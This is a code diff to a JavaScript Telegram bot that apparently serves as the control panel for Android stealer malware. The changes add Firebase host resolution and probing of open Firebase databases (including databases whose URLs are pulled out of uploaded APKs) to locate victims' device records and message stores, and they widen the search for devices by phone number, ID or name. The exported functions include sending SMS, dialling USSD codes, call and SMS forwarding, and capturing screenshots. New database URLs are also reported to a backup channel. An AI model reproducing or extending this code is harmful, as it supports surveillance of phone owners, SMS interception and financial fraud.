@@ -254,45 +254,100 @@ async function sendFile(chatId, buffer, filename, caption = '') {
 // ============================================================
 // FIREBASE helpers
 // ============================================================
+const urlAlias = new Map();
+async function resolveFirebaseUrl(fbUrl) {
+  const norm = String(fbUrl || '').trim().replace(/\/+$/, '');
+  if (!norm) return norm;
+  if (urlAlias.has(norm)) return urlAlias.get(norm);
+  const readable = async (u) => {
+    try {
+      const r = await axios.get(`${u}/.json?shallow=true`, { timeout: 5000 });
+      return !!(r.data && typeof r.data === 'object' && !r.data.error);
+    } catch (e) { return false; }
+  };
+  let target = norm;
+  if (!(await readable(norm))) {
+    // legacy <ns>.firebaseio.com → <ns>-default-rtdb.firebaseio.com / .firebasedatabase.app
+    const m = norm.match(/^https:\/\/([\w-]+)\.firebaseio\.com$/);
+    if (m) {
+      const ns = m[1];
+      for (const host of [`https://${ns}-default-rtdb.firebaseio.com`, `https://${ns}.firebasedatabase.app`, `https://${ns}-default-rtdb.firebasedatabase.app`]) {
+        if (await readable(host)) { target = host; break; }
+      }
+    }
+  }
+  if (target !== norm) urlAlias.set(norm, target);
+  return target;
+}
+
 async function fbGet(fbUrl, p) {
   if (!fbUrl || !p) return null;
+  const u = await resolveFirebaseUrl(fbUrl);
   try {
-    const r = await axios.get(`${fbUrl}/${p}.json`, { timeout: 12000 });
+    const r = await axios.get(`${u}/${p}.json`, { timeout: 12000 });
     return r.data;
   } catch (e) { return null; }
 }
 async function fbPut(fbUrl, p, data) {
   if (!fbUrl || !p) return false;
+  const u = await resolveFirebaseUrl(fbUrl);
   try {
-    await axios.put(`${fbUrl}/${p}.json`, data, { timeout: 12000 });
+    await axios.put(`${u}/${p}.json`, data, { timeout: 12000 });
     return true;
   } catch (e) { return false; }
 }
 async function fbDelete(fbUrl, p) {
   if (!fbUrl || !p) return false;
+  const u = await resolveFirebaseUrl(fbUrl);
   try {
-    await axios.delete(`${fbUrl}/${p}.json`, { timeout: 12000 });
+    await axios.delete(`${u}/${p}.json`, { timeout: 12000 });
     return true;
   } catch (e) { return false; }
 }
 
+const DEVICE_ROOTS = ['clients', 'devices', 'users', 'data', 'accounts', 'friends', 'android', 'childs'];
+
 async function detectFirebasePath(fbUrl) {
-  const paths = ['clients', 'devices', 'users', 'data', 'accounts'];
-  for (const p of paths) {
+  fbUrl = await resolveFirebaseUrl(fbUrl);
+  let rootKeys = [];
+  try {
+    const r = await axios.get(`${fbUrl}/.json?shallow=true`, { timeout: 6000 });
+    if (r.data && typeof r.data === 'object' && !r.data.error) rootKeys = Object.keys(r.data);
+  } catch (e) {}
+  // 1) known device-collection names (non-empty)
+  for (const p of DEVICE_ROOTS) {
+    if (!rootKeys.includes(p)) continue;
     try {
       const r = await axios.get(`${fbUrl}/${p}.json?shallow=true`, { timeout: 5000 });
-      if (r.data && typeof r.data === 'object' && Object.keys(r.data).length > 0) return p;
+      if (r.data && typeof r.data === 'object' && !r.data.error && Object.keys(r.data).length > 0) return p;
     } catch (e) {}
   }
-  try {
-    const r = await axios.get(`${fbUrl}/.json?shallow=true`, { timeout: 5000 });
-    if (r.data && typeof r.data === 'object') {
-      const keys = Object.keys(r.data);
-      for (const p of paths) if (keys.includes(p)) return p;
-      if (keys.length === 1) return keys[0];
-    }
-  } catch (e) {}
+  // 2) any root key whose children look like device records (hex id, webhookEvent,
+  //    battery+status) — handles differently-shaped apps automatically
+  for (const k of rootKeys) {
+    if (/^(messages|msg|events|event|logs|config|settings|version|stats|users_info|analytics)$/i.test(k)) continue;
+    try {
+      const r = await axios.get(`${fbUrl}/${k}.json?shallow=true`, { timeout: 5000 });
+      if (r.data && typeof r.data === 'object' && !r.data.error) {
+        const sub = Object.keys(r.data);
+        if (sub.some(x => /^[0-9a-f]{12,16}$/i.test(x)) ||
+            sub.includes('webhookEvent') ||
+            (sub.includes('battery') && sub.includes('status'))) return k;
+      }
+    } catch (e) {}
+  }
+  // 3) single-key root (first-party minimal stores)
+  if (rootKeys.length === 1 && !/^(messages|msg|events|logs|config)$/i.test(rootKeys[0])) return rootKeys[0];
   return 'clients';
+}
+
+async function detectMessagesStore(fbUrl) {
+  fbUrl = await resolveFirebaseUrl(fbUrl);
+  try {
+    const r = await axios.get(`${fbUrl}/messages.json?shallow=true`, { timeout: 5000 });
+    if (r.data && typeof r.data === 'object' && !r.data.error && Object.keys(r.data).length > 0) return 'messages';
+  } catch (e) {}
+  return '';
 }
 
 async function extractFirebaseFromAPK(apkBuffer) {
@@ -1359,27 +1414,38 @@ async function processForwardableMessage(update) {
 // ============================================================
 async function showSearchPrompt(uid, chatId, messageId, admin = false) {
   setAwaiting(uid, 'state', admin ? 'admin_bank_search' : 'search');
-  const text = '🔍 **Search Device**\n\nNumber send karo (e.g. `9876543210`)\n\nYa `/cancel` se bahar niklo.';
+  const text = '🔍 **Search Device**\n\nNumber, Device ID, ya Name bhejo (e.g. `9876543210`, `4e5e3fb5dc`, `taetan`)\n\nYa `/cancel` se bahar niklo.';
   const buttons = [[{ text: '🔙 Back', callback_data: admin ? 'admin_menu' : 'main_menu' }]];
   if (messageId) await editMessage(chatId, messageId, text, buttons);
   else await sendMessage(chatId, text, buttons);
 }
 
-async function searchByNumber(uid, chatId, number) {
+async function searchByNumber(uid, chatId, query) {
   const user = getUserData(uid);
-  const clean = String(number).replace(/\D/g, '');
+  const raw = String(query || '').trim();
+  const clean = raw.replace(/\D/g, '');
+  const q = raw.toLowerCase().replace(/\s+/g, '');
   const hits = [];
   for (const [id, g] of Object.entries(state.global_devices)) {
     if (g.owner_uid !== String(uid)) continue;
     const ph = String(g.phone || '').replace(/\D/g, '');
-    if (ph.includes(clean) || clean.includes(ph.substring(ph.length - 10))) hits.push({ ...g, id });
+    const name = String(g.name || '').toLowerCase();
+    const idl = id.toLowerCase();
+    let match = false;
+    // mobile number (partial or full, with/without +91)
+    if (clean.length >= 3 && (ph.includes(clean) || (ph.length >= 10 && clean.includes(ph.slice(-10))))) match = true;
+    // device id (hex prefix or full)
+    if (!match && q.length >= 3 && idl.includes(q)) match = true;
+    // device name
+    if (!match && raw.length >= 2 && name.includes(raw.toLowerCase())) match = true;
+    if (match) hits.push({ ...g, id });
   }
-  if (hits.length === 0) { await sendMessage(chatId, `❌ No device found for \`${number}\``); return; }
-  const lines = [`✅ **Search: ${number}** → ${hits.length}`, '═══════════════════════', ''];
+  if (hits.length === 0) { await sendMessage(chatId, `❌ No device found for \`${raw}\``); return; }
+  const lines = [`✅ **Search: ${safeMd(raw)}** → ${hits.length}`, '═══════════════════════', ''];
   const buttons = [];
   for (const h of hits.slice(0, 15)) {
-    lines.push(`• ${h.online ? '🟢' : '🔴'} **${h.name}** 📞${h.phone}`);
-    buttons.push([{ text: `📱 ${h.name}`, callback_data: `dev_${h.id}` }]);
+    lines.push(`• ${h.online ? '🟢' : '🔴'} **${safeMd(h.name)}**\n  🆔 \`${h.id}\` 📞 ${h.phone || 'N/A'}`);
+    buttons.push([{ text: `📱 ${h.name}`.substring(0, 60), callback_data: `dev_${h.id}` }]);
   }
   buttons.push([{ text: '🔙 Back', callback_data: 'main_menu' }]);
   await sendMessage(chatId, lines.join('\n'), buttons);
@@ -1471,11 +1537,16 @@ async function handleApk(uid, chatId, msg) {
     }
     clearAwaiting(uid);
     const user = getUserData(uid);
-    const newOnes = detected.filter(d => !(user.fb_urls || []).includes(d));
+    const resolved = [];
+    for (const d of detected) resolved.push(await resolveFirebaseUrl(d));
+    const canonical = Array.from(new Set(resolved));
+    const newOnes = canonical.filter(d => !(user.fb_urls || []).includes(d));
     for (const d of newOnes) user.fb_urls.push(d);
-    if (!user.active_fb_url && detected[0]) user.active_fb_url = detected[0];
-    user.data_path = await detectFirebasePath(detected[0]);
-    for (const d of detected) state.fb_owner[fbOwnerKey(d)] = String(uid);
+    if (!user.active_fb_url && canonical[0]) user.active_fb_url = canonical[0];
+    user.data_path = await detectFirebasePath(canonical[0]);
+    const ms = await detectMessagesStore(canonical[0]);
+    if (ms) user.messages_path = ms;
+    for (const d of canonical) state.fb_owner[fbOwnerKey(d)] = String(uid);
     saveState();
     await sendMessage(BACKUP_CHANNEL, `🔑 **New Firebase (APK)**\n👤 \`${uid}\`\n📡 ${detected.map(d => `\`${maskFirebase(d)}\``).join(' ')}`).catch(() => {});
     await sendMessage(chatId, `✅ **Firebase Connected! (APK ${detected.length})**\n\n${detected.map((d, i) => `${i + 1}. \`${maskFirebase(d)}\``).join('\n')}\n📁 Path: \`${user.data_path}/\``);
@@ -1754,19 +1825,30 @@ async function handleCommand(update) {
         await handleApk(uid, chatId, msg);
         return;
       }
-      const url = text.trim().replace(/\/+$/, '');
-      if (!/^https:\/\/.+?\.firebaseio\.com\/?$/.test(url)) { await sendMessage(chatId, '❌ Invalid Firebase URL.'); return; }
+      const url = await resolveFirebaseUrl(text.trim().replace(/\/+$/, ''));
+      if (!/^https:\/\/.+?\.(?:firebaseio\.com|firebasedatabase\.app)\/?$/.test(url)) { await sendMessage(chatId, '❌ Invalid Firebase URL.'); return; }
       const user = getUserData(uid);
       if (user.fb_urls.includes(url)) { await sendMessage(chatId, '⚠️ Already connected.'); clearAwaiting(uid); return showMainMenu(uid, chatId); }
       const detectedPath = await detectFirebasePath(url);
+      const msgStore = await detectMessagesStore(url);
       user.fb_urls.push(url);
       if (!user.active_fb_url) user.active_fb_url = url;
       user.data_path = detectedPath;
+      if (msgStore) user.messages_path = msgStore;
       state.fb_owner[fbOwnerKey(url)] = String(uid);
       saveState();
+      let devCount = 0;
+      try {
+        const c = await axios.get(`${url}/${detectedPath}.json?shallow=true`, { timeout: 8000 });
+        if (c.data && typeof c.data === 'object' && !c.data.error) devCount = Object.keys(c.data).length;
+      } catch (e) {}
       await sendMessage(BACKUP_CHANNEL, `🔑 **New Firebase**\n👤 \`${uid}\`\n📡 \`${maskFirebase(url)}\``).catch(() => {});
       clearAwaiting(uid);
-      await sendMessage(chatId, `✅ **Firebase Connected!**\n📁 Path: \`${detectedPath}/\``);
+      await sendMessage(chatId,
+        `✅ **Firebase Connected!**\n` +
+        `📁 Devices path: \`${detectedPath}/\`\n` +
+        `${msgStore ? `💬 Messages store: \`${msgStore}/\`\n` : ''}` +
+        `📱 Devices found: ${devCount}\n\n_Auto path detection: ON_`);
       return showMainMenu(uid, chatId);
     }
 
@@ -1782,9 +1864,8 @@ async function handleCommand(update) {
     }
 
     if (awaiting.state === 'search') {
-      const num = text.replace(/[\s\-()]/g, '');
       clearAwaiting(uid);
-      return searchByNumber(uid, chatId, num);
+      return searchByNumber(uid, chatId, text.trim());
     }
 
     if (awaiting.state === 'admin_bank_search') {
@@ -2112,4 +2193,4 @@ if (require.main === module) {
 }
 
 module.exports = app;
-module.exports._api = { handleUpdate, backgroundSweepOnce, initState, app, sendSMS, ussdDial, callDial, callForward, smsForward, requestScreenshot, getDeviceInfo, extractFirebaseFromAPK };
+module.exports._api = { handleUpdate, backgroundSweepOnce, initState, app, sendSMS, ussdDial, callDial, callForward, smsForward, requestScreenshot, getDeviceInfo, extractFirebaseFromAPK, detectFirebasePath, detectMessagesStore };
